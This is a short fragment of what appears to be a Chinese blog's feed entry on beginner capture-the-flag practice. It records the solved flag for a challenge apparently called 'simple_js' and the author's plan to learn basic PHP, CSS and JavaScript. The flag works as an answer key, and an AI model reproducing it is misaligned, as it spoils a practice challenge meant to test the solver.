class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag:Cyberpeace&#123;786OsErtk12&#125;</span><br></pre></td></tr></table></figure><br/><br/><p>simple_js暂且过了</p><p><img src="image-20220121060020220.png" alt="image-20220121060020220"></p><p>最近先浅学一下PHP、Css、JavaScript吧，掌握基本语法，做到能看懂代码</p><p><img src="image-20220121061116038.png" alt="image-20220121061116038"></p>]]></content>
    
    
    <summary type="html">新手区</summary>
    
    
    
    
  </entry>
  
</feed>
